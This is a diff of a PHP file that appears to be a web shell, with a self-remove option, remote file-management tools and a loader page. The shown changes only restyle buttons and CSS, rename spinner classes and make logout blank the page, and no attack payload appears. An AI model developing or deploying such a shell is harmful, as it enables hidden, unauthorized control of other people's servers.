@@ -89,9 +89,9 @@ function mInput($arg){
 
 function mSubmit($v, $o, $nl = false){
 	if (isset($nl))
-		return "<p><input type='button' value='$v' onclick='$o;return false;'></p>";
+		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;'></p>";
 	else
-		return "<input type='button' value='$v' onclick='$o;return false;'>";
+		return "<input class='button' type='button' value='$v' onclick='$o;return false;'>";
 }
 
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
@@ -643,7 +643,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		$sysMenu .= mLink("<b>$CCCPtitle[$i]</b>", 'ajaxLoad("me=' . $CCCPmod[$i] . '")') . ($i == $countMenu ? '' : ' | ');
 		$i++;
 	}			 
-	$sysMenu .= mLink('<b>' . tText('srm', 'Self Remove') . '</b>', 'ajaxLoad("me=srm")') . ' | ' . mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) sessionStorage.clear()');
+	$sysMenu .= mLink('<b>' . tText('srm', 'Self Remove') . '</b>', 'ajaxLoad("me=srm")') . ' | ' . mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}');
 	
 	$loader = '
 		<!DOCTYPE html>
@@ -884,7 +884,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function viewSize(f){
-		f.innerHTML = "<div class=\'loading loadingmini\'></div>";
+		f.innerHTML = "<div class=\'loading mini\'></div>";
 		ajax("me=file&md=vs&f=" + euc(dpath(f, true)), function(r){
 			f.innerHTML = r;
 		});
@@ -964,7 +964,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
             if (a !== "copy" && a !== "rdel") o = euc(o);
             if (a === "ren") n = d.getElementById("base").value + n;
            
-            append("box", "<div id=\'mloading\' class=\'loading loadingmini\'></div>");
+            append("box", "<div id=\'mloading\' class=\'loading mini\'></div>");
             ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
                 remove("mloading");
                 if (r === "OK"){
@@ -1122,12 +1122,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			text-decoration: underline;
 		}
 		input, textarea, button, select, option{
-			background-color: #800000; 
+			background-color: #800; 
 			border: 0; 
 			font-size: 8pt;  
 			font-family: Tahoma;
-			padding: 3px;
-			margin: 3px;
+			margin: 5px;
+			padding: 6px;
 		}
 		p{
 			margin-top: 0px;
@@ -1201,7 +1201,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			background:#7d7474;
 			font-weight:bold;
 			text-align:center;
-			cursor:pointer;
+			cursor:move;
 			padding: 3px;
 		}
 		.boxtitle a, .boxtitle a:hover{
@@ -1246,10 +1246,10 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			color:#fff;
 			background:#800;
 			border:none;
-			padding:6px;
 			display:block;
 			text-align:center;
-			float:left;
+			/*float:left;*/
+			padding: 6px;
 			cursor:pointer;
 		}
 		.button:hover, #ulDragNDrop:hover{
@@ -1290,7 +1290,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			-moz-animation: spin .5s infinite linear;
 			-webkit-animation: spin .5s infinite linear;
 		}
-		.loadingmini {
+		.mini {
 			border: 2px solid #800;
 			border-top: 2px solid rgba(0,0,0,0);
 			border-left: 2px solid rgba(0,0,0,0);
